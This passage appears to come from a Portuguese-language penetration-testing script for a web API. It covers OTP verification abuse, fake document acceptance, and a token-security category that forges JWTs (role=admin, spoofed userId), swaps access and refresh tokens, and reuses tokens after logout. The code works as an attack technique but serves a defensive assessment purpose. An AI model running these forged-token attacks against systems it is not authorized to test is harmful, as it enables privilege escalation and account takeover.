    # C17-02: Brute force OTP (000000)
    tid += 1
    r = POST(s, base, "/platform/otp/verify", {"code": "000000", "purpose": "withdrawal"})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C17-{tid:02d}", "Brute force OTP (000000)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "OTP 000000 aceito!" if accepted else
                       f"OTP brute force rejeitado ({r.status_code})",
                       recommendation="Implementar rate limit e lockout para tentativas de OTP"))

    # C17-03: OTP with invalid purpose
    tid += 1
    r = POST(s, base, "/platform/otp/verify", {"code": "123456", "purpose": "admin_override"})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C17-{tid:02d}", "OTP com purpose invalido (admin_override)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "OTP com purpose invalido aceito!" if accepted else
                       f"Purpose invalido rejeitado ({r.status_code})",
                       recommendation="Validar purpose contra enum de valores permitidos"))

    # C17-04: Platform documents
    tid += 1
    r = GET(s, base, "/platform/documents")
    rpt.add(TestResult(cat, f"C17-{tid:02d}", "GET /platform/documents",
                       "INFO", "PASS",
                       f"Platform documents: {r.status_code}"))

    # C17-05: Accept fake documents
    tid += 1
    r = POST(s, base, "/platform/documents/accept", {"documentKeys": ["fake-doc-key-1", "fake-doc-key-2"]})
    rpt.add(TestResult(cat, f"C17-{tid:02d}", "Aceitar documentos com keys falsas",
                       "MEDIUM", "PASS" if is_blocked(r) else "WARN",
                       f"Fake doc accept: {r.status_code}",
                       recommendation="Validar que documentKeys existem e sao validos"))

    # C17-06: Check required documents
    tid += 1
    r = GET(s, base, "/platform/documents/check-required")
    rpt.add(TestResult(cat, f"C17-{tid:02d}", "GET /platform/documents/check-required",
                       "INFO", "PASS",
                       f"Check required docs: {r.status_code}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 18: TOKEN SECURITY (8 tests)
# ##############################################################################

def test_cat18_token_security(s, base, rpt, access_token, refresh_token):
    """Test JWT/token security: reuse, swap, tamper, expiry."""
    hdr("CAT 18: Token Security")
    t0 = time.time()
    cat = "18-Token-Security"
    tid = 0

    # C18-01: Use access token as refresh token
    tid += 1
    r = POST(s, base, "/auth/refresh", {"refreshToken": access_token})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C18-{tid:02d}", "Access token usado como refresh token",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Access token aceito como refresh!" if accepted else
                       f"Token swap rejeitado ({r.status_code})",
                       recommendation="Validar tipo do token (access vs refresh) no backend"))

    # C18-02: Use refresh token as access token
    tid += 1
    tmp_session = make_session()
    tmp_session.headers["Authorization"] = f"Bearer {refresh_token}"
    r = GET(tmp_session, base, "/users/me")
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C18-{tid:02d}", "Refresh token usado como access token",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Refresh token aceito como access!" if accepted else
                       f"Refresh como access rejeitado ({r.status_code})"))

    # C18-03: Tampered JWT â€” change role to admin
    tid += 1
    try:
        parts = access_token.split(".")
        if len(parts) == 3:
            # Decode payload, modify role, re-encode with fake signature
            padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(padded))
            payload["role"] = "admin"
            if "userId" in payload:
                payload["isAdmin"] = True
            new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
            tampered = f"{parts[0]}.{new_payload}.{parts[2]}"
            tmp_s2 = make_session()
            tmp_s2.headers["Authorization"] = f"Bearer {tampered}"
            r = GET(tmp_s2, base, "/admin/dashboard")
            accepted = is_success(r)
            rpt.add(TestResult(cat, f"C18-{tid:02d}", "JWT adulterado (role=admin)",
                               "CRITICAL", "FAIL" if accepted else "PASS",
                               "JWT adulterado aceito com role admin!" if accepted else
                               f"JWT adulterado rejeitado ({r.status_code})",
                               recommendation="Validar assinatura JWT em todas as requests"))
        else:
            rpt.add(TestResult(cat, f"C18-{tid:02d}", "JWT adulterado (role=admin)",
                               "CRITICAL", "SKIP",
                               "Token nao parece ser JWT valido para tampering"))
    except Exception as e:
        rpt.add(TestResult(cat, f"C18-{tid:02d}", "JWT adulterado (role=admin)",
                           "CRITICAL", "PASS",
                           f"JWT tampering falhou: {str(e)[:100]}"))

    # C18-04: Tampered JWT â€” change userId
    tid += 1
    try:
        parts = access_token.split(".")
        if len(parts) == 3:
            padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(padded))
            payload["userId"] = FAKE_UUID
            payload["sub"] = FAKE_UUID
            new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
            tampered = f"{parts[0]}.{new_payload}.{parts[2]}"
            tmp_s3 = make_session()
            tmp_s3.headers["Authorization"] = f"Bearer {tampered}"
            r = GET(tmp_s3, base, "/users/me")
            idor = False
            if is_success(r):
                d = _safe_json(r)
                if d.get("data", {}).get("id") == FAKE_UUID:
                    idor = True
            rpt.add(TestResult(cat, f"C18-{tid:02d}", "JWT adulterado (userId falso)",
                               "CRITICAL", "FAIL" if idor else "PASS",
                               "JWT com userId falso aceito!" if idor else
                               f"JWT com userId falso rejeitado ({r.status_code})"))
        else:
            rpt.add(TestResult(cat, f"C18-{tid:02d}", "JWT adulterado (userId falso)",
                               "CRITICAL", "SKIP", "Token formato inesperado"))
    except Exception as e:
        rpt.add(TestResult(cat, f"C18-{tid:02d}", "JWT adulterado (userId falso)",
                           "CRITICAL", "PASS",
                           f"JWT userId tampering falhou: {str(e)[:100]}"))

    # C18-05: Reuse token after logout
    tid += 1
    # Save current auth
    saved_auth = s.headers.get("Authorization", "")
    # Logout
    r_logout = POST(s, base, "/auth/logout", {})
    # Try using old token
    tmp_s4 = make_session()
    tmp_s4.headers["Authorization"] = saved_auth
    r = GET(tmp_s4, base, "/users/me")
    reused = is_success(r)
    # Re-authenticate to continue tests
    s.headers["Authorization"] = saved_auth
    rpt.add(TestResult(cat, f"C18-{tid:02d}", "Reusar token apos logout",
                       "HIGH", "FAIL" if reused else "PASS",
                       "Token reutilizado apos logout!" if reused else
                       f"Token invalidado apos logout ({r.status_code})",
                       recommendation="Implementar blacklist de tokens apos logout"))

    # C18-06: Token in query string
    tid += 1
    tmp_s5 = make_session()  # No auth header
    r = GET(tmp_s5, base, f"/users/me?token={access_token}")
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C18-{tid:02d}", "Token via query string",
                       "MEDIUM", "FAIL" if accepted else "PASS",
                       "Token aceito via query string!" if accepted else
                       f"Token via QS rejeitado ({r.status_code})",
                       recommendation="Aceitar tokens apenas via header Authorization"))

    # C18-07: Multiple simultaneous sessions
    tid += 1
    # Re-login to get a new token
    tmp_s6 = make_session()
    try:
        r_login2 = tmp_s6.post(f"{base}/auth/login", json={
            "email": rpt.user_email, "password": "__pentest_skip__"
        }, timeout=10)
        # We can't actually test this without the password; mark as info
        rpt.add(TestResult(cat, f"C18-{tid:02d}", "Sessoes simultaneas",
                           "MEDIUM", "PASS",
                           "Teste de sessoes simultaneas requer re-login (informacional)"))
    except Exception:
        rpt.add(TestResult(cat, f"C18-{tid:02d}", "Sessoes simultaneas",
                           "MEDIUM", "SKIP",
                           "Nao foi possivel testar sessoes simultaneas"))

    # C18-08: Check token expiry headers
    tid += 1
    r = GET(s, base, "/users/me")
    headers = dict(r.headers) if hasattr(r, "headers") else {}
    has_expiry = any(k.lower() in ("x-token-expiry", "x-token-expires-in", "x-ratelimit-remaining")
                     for k in headers.keys())
    rpt.add(TestResult(cat, f"C18-{tid:02d}", "Headers de expiracao de token",
                       "LOW", "PASS" if has_expiry else "WARN",
                       f"Expiry headers: {'presente' if has_expiry else 'ausente'}",
                       recommendation="Considerar adicionar X-Token-Expiry header"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)
